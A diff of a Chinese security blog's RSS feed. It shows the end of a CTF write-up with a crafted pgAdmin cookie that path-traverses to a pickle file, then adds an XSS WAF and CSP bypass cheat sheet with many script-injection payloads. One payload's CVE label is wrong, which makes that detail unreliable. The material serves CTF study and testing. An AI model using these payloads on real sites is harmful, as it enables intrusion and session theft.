@@ -8,11 +8,11 @@
         <pubDate>Wed, 24 Apr 2024 11:53:34 +0800</pubDate>
         <lastBuildDate>Wed, 24 Apr 2024 11:53:34 +0800</lastBuildDate>
         <category>渗透</category>
-        <category>PWN</category>
         <category>WEB</category>
-        <category>mobile</category>
-        <category>比赛</category>
+        <category>PWN</category>
         <category>HTB</category>
+        <category>比赛</category>
+        <category>mobile</category>
         <category>reverse</category>
         <category>CTF</category>
         <category>记录贴</category>
@@ -563,6 +563,199 @@ b&#39;paluctf{1_4m_th3_b0td_1n_t3st_1n_th3_r0w}’&lt;/p&gt;
 &lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /browser/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn/login?next=%2F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!baeac19e-2dcc-4d96-a4c7-1ff410ddd8c2!AZleysLS+ZnrL20IU1mGt6lHxXc3O8/It0JHyC4sJqA=; PGADMIN_LANGUAGE=en&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;构造如上，路径无所谓&lt;/p&gt;
 &lt;p&gt;公网 ip 监听端口即可&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://lookhui.github.io/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/</guid>
+            <title>小工具</title>
+            <link>https://lookhui.github.io/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/</link>
+            <pubDate>Sat, 09 Mar 2024 20:25:51 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;xss注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss注入&#34;&gt;#&lt;/a&gt; XSS 注入&lt;/h2&gt;
+&lt;h3 id=&#34;xss绕waf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss绕waf&#34;&gt;#&lt;/a&gt; XSS 绕 WAF&lt;/h3&gt;
+&lt;h4 id=&#34;编码混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编码混淆&#34;&gt;#&lt;/a&gt; &lt;strong&gt;编码混淆&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;html-实体编码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html-实体编码绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;HTML 实体编码绕过&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 服务端过滤 &amp;lt;script&amp;gt; 但未递归解码 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt; → 二次解码后执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;jsfuck-等极端混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfuck-等极端混淆&#34;&gt;#&lt;/a&gt; &lt;strong&gt;JSFuck 等极端混淆&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;用  &lt;code&gt;[]()!+&lt;/code&gt;  等 6 个字符构造有效代码：&lt;/p&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]...](&amp;quot;alert(1)&amp;quot;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;上下文感知绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上下文感知绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;上下文感知绕过&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;在-javascript-字符串中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在-javascript-字符串中&#34;&gt;#&lt;/a&gt; &lt;strong&gt;在 JavaScript 字符串中&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 原始输入：userInput = &amp;quot;user-data&amp;quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;let data = &amp;quot;User: &amp;quot; + userInput; // 期望字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 攻击：闭合字符串并执行代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;userInput = &amp;#x27;&amp;quot;;alert(1);//&amp;#x27; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 结果：let data = &amp;quot;User: &amp;quot;&amp;quot;;alert(1);//&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;在-html-属性中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在-html-属性中&#34;&gt;#&lt;/a&gt; &lt;strong&gt;在 HTML 属性中&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 基础过滤：禁止 onerror --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;x&amp;quot; alt=&amp;quot;test&amp;quot; onload=alert(1)&amp;gt; &amp;lt;!-- 尝试其他事件 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 利用无引号属性 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=x%20onerror=alert(1)&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;绕过-csp-限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-csp-限制&#34;&gt;#&lt;/a&gt; &lt;strong&gt;绕过 CSP 限制&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;jsonp-端点滥用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsonp-端点滥用&#34;&gt;#&lt;/a&gt; &lt;strong&gt;JSONP 端点滥用&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 假设CSP允许：script-src &amp;#x27;self&amp;#x27; api.example.com --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=&amp;quot;https://api.example.com/jsonp?callback=alert(1)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;angularjs-沙箱逃逸cve-2016-9079&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#angularjs-沙箱逃逸cve-2016-9079&#34;&gt;#&lt;/a&gt; &lt;strong&gt;AngularJS 沙箱逃逸&lt;/strong&gt;（CVE-2016-9079）：&lt;/h6&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;x = &amp;#123;&amp;#x27;y&amp;#x27;:&amp;#x27;&amp;#x27;.constructor.prototype&amp;#125;; x[&amp;#x27;y&amp;#x27;].charAt=[].join;$eval(&amp;#x27;x=alert(1)&amp;#x27;);&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;非常规标签与协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#非常规标签与协议&#34;&gt;#&lt;/a&gt; &lt;strong&gt;非常规标签与协议&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;svg-向量图形注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#svg-向量图形注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;SVG 向量图形注入&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; onload=&amp;quot;alert(1)&amp;quot;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;data-uri-协议执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#data-uri-协议执行&#34;&gt;#&lt;/a&gt; &lt;strong&gt;data URI 协议执行&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;text&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;iframe src=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;dom-clobbering-攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom-clobbering-攻击&#34;&gt;#&lt;/a&gt; &lt;strong&gt;DOM Clobbering 攻击&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;覆盖 DOM 属性控制 JS 逻辑：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 漏洞代码：if (window.config &amp;amp;&amp;amp; window.config.isAdmin) &amp;#123;...&amp;#125; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=config&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=config name=isAdmin href=admin&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 此时 window.config.isAdmin 为 DOM 元素而非 undefined --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h4 id=&#34;针对现代框架的绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对现代框架的绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;针对现代框架的绕过&lt;/strong&gt;&lt;/h4&gt;
+&lt;h5 id=&#34;react-jsx-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#react-jsx-注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;React JSX 注入&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;危险绕过  &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; &lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 开发者错误使用：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div dangerouslySetInnerHTML=&amp;#123;&amp;#123; __html: userContent &amp;#125;&amp;#125; /&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 攻击：userContent = &amp;#x27;&amp;lt;img src=x onerror=stealData()&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;绕过  &lt;code&gt;&amp;#123;expression&amp;#125;&lt;/code&gt;  沙箱&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 输入：userInput = &amp;quot;javascript:alert(1)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;#123;userInput&amp;#125;&amp;gt;Click&amp;lt;/a&amp;gt; &amp;lt;!-- 触发XSS --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;vuejs-的-v-html-指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vuejs-的-v-html-指令&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Vue.js 的 v-html 指令&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;未过滤的  &lt;code&gt;v-html&lt;/code&gt; &lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;vue&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;template&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;div v-html=&amp;quot;userContent&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;!-- 直接渲染HTML --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/template&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h4 id=&#34;绕过-waf过滤器的技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-waf过滤器的技巧&#34;&gt;#&lt;/a&gt; &lt;strong&gt;绕过 WAF / 过滤器的技巧&lt;/strong&gt;&lt;/h4&gt;
+&lt;h5 id=&#34;分块拼接-fragmentation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分块拼接-fragmentation&#34;&gt;#&lt;/a&gt; &lt;strong&gt;分块拼接 (Fragmentation)&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;拆分关键词绕过正则&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;javascript&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 原始：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 变异：&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;al\u0065rt(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;利用浏览器解析差异&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用浏览器解析差异&#34;&gt;#&lt;/a&gt; &lt;strong&gt;利用浏览器解析差异&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;html-注释干扰&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html-注释干扰&#34;&gt;#&lt;/a&gt; &lt;strong&gt;HTML 注释干扰&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 过滤规则：删除 &amp;lt;script&amp;gt; 标签 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;scr&amp;lt;!--test--&amp;gt;ipt&amp;gt;alert(1)&amp;lt;/scr&amp;lt;!--test--&amp;gt;ipt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;无效属性混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无效属性混淆&#34;&gt;#&lt;/a&gt; &lt;strong&gt;无效属性混淆&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img a=&amp;quot;&amp;#x27;&amp;quot; b=&amp;#x27;&amp;quot;&amp;#x27; src=x onerror=alert(1)&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;unicode-与大小写变异&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unicode-与大小写变异&#34;&gt;#&lt;/a&gt; Unicode 与大小写变异&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;大小写混合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写混合&#34;&gt;#&lt;/a&gt; &lt;strong&gt;大小写混合&lt;/strong&gt;：&lt;/h6&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;sCriPt&amp;gt;alert(1)&amp;lt;/scRIPt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;h6 id=&#34;unicode-转义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unicode-转义&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Unicode 转义&lt;/strong&gt;：&lt;/h6&gt;
